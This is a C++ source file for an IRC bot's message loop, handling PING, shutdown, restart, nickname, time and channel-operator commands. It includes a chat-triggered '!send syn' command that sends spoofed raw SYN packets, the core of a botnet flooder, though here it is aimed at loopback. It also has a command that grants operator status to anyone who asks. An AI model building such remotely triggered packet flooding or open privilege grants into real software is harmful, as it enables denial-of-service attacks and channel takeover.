#include "bot.h"
#include "mytime.h"
#include "rawsock.h"
#include <iostream>
#include <stdlib.h>
#include <string.h>


using namespace std;

int IrcBot::start()				// overloading IrcClient::start()
{
  char buf[MAXDATASIZE];			// This will hold the socket recv buffer
  IrcMessage ircMsg;				// This will be used to parse and send Irc messages

  string parameters;     	                // parameters to be sent to IRC server using IrcMessage::send(socket, command, parameters) function
 
  rawsock rawsockfd;				// initialise the raw socket for our SYN packet sender

  while(sockfd.in(buf))
  {
    
    ircMsg.recv(buf);			           // This will parse the received message into seperate variables for easy matching

    if(ircMsg.command == "PING")                   // IRC server sends occational PING message. client has to reply within 30 seconds otherwise will be disconnected
    {
      ircMsg.send(sockfd, "PONG", ircMsg.parameters);
    }

    else if(ircMsg.command == "PRIVMSG")                 // Check if we receive a PRIVMSG
    {
      if(ircMsg.parameters.find(":!shutdown") == 0)
      {
        ircMsg.send(sockfd, "PRIVMSG", "#ThieZn Shutting down myself, was nice to see you again!");

        sockfd.unlink(); 
        cout << endl << endl << "Closed socket, shutting down bot..." << endl << "Thanks, please come again!" << endl << endl;

        return 0;
      }

      else if(ircMsg.parameters.find(":!restart") == 0)
      {
        ircMsg.send(sockfd, "PRIVMSG", "#ThieZn Restarting... bear with me, i should be right back!");

        sockfd.unlink();
        cout << endl << endl << "Closed socket, preparing to restart bot..." << endl << endl;

        return 1;
      }

      else if(ircMsg.parameters.find(":!send") == 0)
      {
        ircMsg.parameters.erase(0, 7);

        if(ircMsg.parameters.find("syn") == 0)
        {
          for(int i = 0; i < 10; i++)
          {
            rawsockfd.sendSYN("10.0.0.1", "127.0.0.1", 6667);
          }
        }
      }

      else if(ircMsg.parameters.find(":!set") == 0)
      {
        ircMsg.parameters.erase(0, 6);					// remove the ":!set " string so we end up with the command

        if(ircMsg.parameters.find("nick") == 0)				// check if we want to change the nick
        {
          ircMsg.parameters.erase(0, 5);				// remove the string 'nick ' from the parameters
          nick = ircMsg.parameters.c_str();				// use all the rest of the parameter string as a nickname

	  ircMsg.send(sockfd, "NICK", nick); 
        } 

        else if(ircMsg.parameters.find("meToOps") == 0)			// promote the user that asks to channel operator
        {
	  parameters = "CHANSERV OP "; 
          parameters += ircMsg.prefixNick.c_str(); 
          parameters += " "; parameters += channel;

          ircMsg.send(sockfd, "PRIVMSG", parameters);
        }

      } // end of !set commands
 
      else if(ircMsg.parameters.find(":!get") == 0)
      {
        ircMsg.parameters.erase(0, 6);

        if(ircMsg.parameters.find("time") == 0)
        {
           parameters = channel; 
           parameters += " my local time is "; 
           parameters += currentDateTime().c_str();

           ircMsg.send(sockfd, "PRIVMSG", parameters);
        }

      }	// end of !get commands

    } // end of PRIVMSG commands

  } // end of while loop (Bot will drop connection)

  sockfd.unlink();							// close the socket as we're no longer receiving data
  return 0;
}

